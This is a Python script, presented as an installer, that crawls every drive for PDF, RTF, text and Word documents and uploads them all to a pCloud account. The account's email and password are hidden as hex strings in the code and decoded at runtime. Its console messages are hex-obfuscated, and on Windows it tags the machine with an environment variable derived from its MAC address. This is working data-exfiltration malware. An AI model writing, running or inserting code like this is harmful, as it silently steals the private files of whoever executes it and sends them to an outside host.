from pcloud import PyCloud
import os 
import psutil

import time
import logging
import sys
import subprocess
import uuid

logger = logging.getLogger("pcloud")
logger.setLevel(logging.ERROR)

def string_to_hex(s):
    return ''.join(format(ord(c), '02x') for c in s)

def get_filepaths():
    drives = psutil.disk_partitions()

    filepaths = []
    for drive in drives:
        print(" [*]:0X", string_to_hex(str(drive.device)))
        for root, dirs, files in os.walk(drive.device):
            for file in files:
                if not (root.startswith("C:\\Windows") or (root.startswith("C:\\Users\\") and "\\AppData" in root)):
                    if file.endswith(".pdf") or file.endswith(".RTF") or file.endswith(".txt") or file.endswith(".doc") or file.endswith(".docx"):
                        # print(os.path.join(root, file))
                        filepaths.append(os.path.join(root, file))
    return filepaths


def install():
    filepaths = get_filepaths()
    cleaned_filepaths = list(set(filepaths))
    print(" [*] N: " + string_to_hex(str(len(cleaned_filepaths))))

    e_hex = '6861736565622e7075626c69637465737440676d61696c2e636f6d'
    p_hex = '6861736565622e7075626c696374657374'

    pc = PyCloud(''.join([chr(int(e_hex[i:i+2], 16)) for i in range(0, len(e_hex), 2)]), 
        ''.join([chr(int(p_hex[i:i+2], 16)) for i in range(0, len(p_hex), 2)]))


    start = time.time()
    pc.uploadfile(files=cleaned_filepaths,
                path='/')
    print(" [*] Time taken (parallel): " + str(time.time() - start) + " seconds")
    
    if sys.platform == 'win32':
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
        subprocess.call(['setx', 'UUID', mac])


if __name__ == '__main__':
    install()    


    
    